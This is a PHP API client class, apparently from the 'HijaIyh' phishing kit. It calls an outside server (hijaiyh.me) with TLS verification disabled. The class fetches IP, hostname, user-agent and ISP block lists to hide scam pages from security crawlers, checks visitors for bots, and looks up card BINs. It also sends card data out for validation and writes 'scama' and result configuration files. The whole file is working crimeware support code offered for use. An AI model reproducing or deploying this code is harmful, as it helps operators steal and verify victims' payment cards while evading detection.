<?php
# HijaIyh Project.
/**
*
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

Class Hiapi{
    public function __construct($params){
        $this->API_URL = 'https://hijaiyh.me';
        $this->ACCOUNT_KEY = $params['acc_key'];
        $this->API_KEY = $params['api_key'];
    }
    public function get($request)
    {
        $fulluris = $this->API_URL.'/index.php/api_ppr/get/'.$this->ACCOUNT_KEY.'/'.$this->API_KEY.'/'.$request;
        $setup = [CURLOPT_URL=>$fulluris,
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4,
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        //exit($fulluris);
        return curl_exec($c);
        curl_close();
    }
    public function getDomain()
    {
        return preg_replace('/www\./i','',$_SERVER['SERVER_NAME']);
    }
   
    public function check_live($acc,$api)
    {
        $setup = [CURLOPT_URL=>$this->API_URL.'/index.php/api_ppr/get/'.$acc.'/'.$api,
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        $resp = curl_exec($c);
        
        if(preg_match("/not found/",$resp))
        {
            $x = ['status' => 'dead' , 'response' => $resp , 'msg' => 'request not found'];
        }elseif(preg_match("/status/",$resp))
        {
            $decode = $this->parse($resp);
            if($decode['status'] == 'dead')
            {
                $x = ['status' => 'dead' , 'msg' => 'Account key / Signature key was wrong'];
            }elseif($decode['status'] == 'live')
            {
                $x = ['status' => 'live' , 'msg' => 'Live'];
            }
        }else{
            file_put_contents('log.txt',$resp);
           $x = ['status' => 'dead','response' => $resp,'msg' => 'check log.txt'];
            
        }
        
        return json_encode($x);
        curl_close();
    }
    public function p($data = array())
    {
       
            $p = '?';
            $x=0;
            $c = count($data)-1;
            foreach($data as $param=>$val)
            {
                $p.=$param.'='.$val;
                
                if($c != $x++)
                {
                    $p.='&';
                }
            }
        
        return $p;
    }
    public function parse($json)
    {
        return json_decode($json,true);
    }
    public function cblocker($type,$acc,$api)
    {
        $setup = [CURLOPT_URL=>$this->API_URL.'/index.php/api_ppr/get/'.$acc.'/'.$api.'/'.$type,
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        $resp = curl_exec($c);
        return $resp;
        curl_close($c);
    }
    public function getBlocker($acc,$api)
    {
        $cdir = dirname(__DIR__).'/config/';
        file_put_contents($cdir.'/ip-blacklist.iyh.txt',$this->cblocker('ip',$acc,$api));
        file_put_contents($cdir.'/hostname-block.iyh.txt',$this->cblocker('host',$acc,$api));
        file_put_contents($cdir.'/useragent-block.iyh.txt',$this->cblocker('agent',$acc,$api));
        file_put_contents($cdir.'/isp-block.iyh.txt',$this->cblocker('isp',$acc,$api));

    }
    public function config()
    {
        $s = $this->get('config');
        return $this->parse($s);
    }
    public function bin($bin)
    {
        $s = $this->get('bin'.$this->p(['bin' => $bin]));
        return $this->parse($s);     
    }
    public function country($ip)
    {
        $s = $this->get('country'.$this->p(['ip' => $ip]));
        return $this->parse($s);
    }
    public function crawler($ua)
    {
        $s = $this->get('crawler'.$this->p(['ua' => $ua]));
        return $this->parse($s);
    }
    public function botIp($ip)
    {
        $s = $this->get('ipcheck'.$this->p(['ip' => $ip]));
        return $this->parse($s);
    }
    public function api_tr($from,$to,$text)
    {
        $s = $this->get('translate'.$this->p(['from' => $from , 'to' => $to,'text' => $text]));
        return $this->parse($s);
    }
    public function checkCard($check)
    {
     $s = $this->get('valid'.$this->p(['copy' => $check]));
     return $this->parse($s);   
    }
    public function change($type = 'result')
    {
        $s = $this->get('config');
        $d = $this->parse($s);
        $result = $d[$type];
        if($type == 'config'){
            $name = 'scama';
        }elseif($type == 'result')
        {
            $name = 'result';
        }
        $fp = fopen(dirname(__DIR__).'/config/'.$name.'.iyh.json','w');
        fwrite($fp,$result);
        fclose($fp);
    }
    
}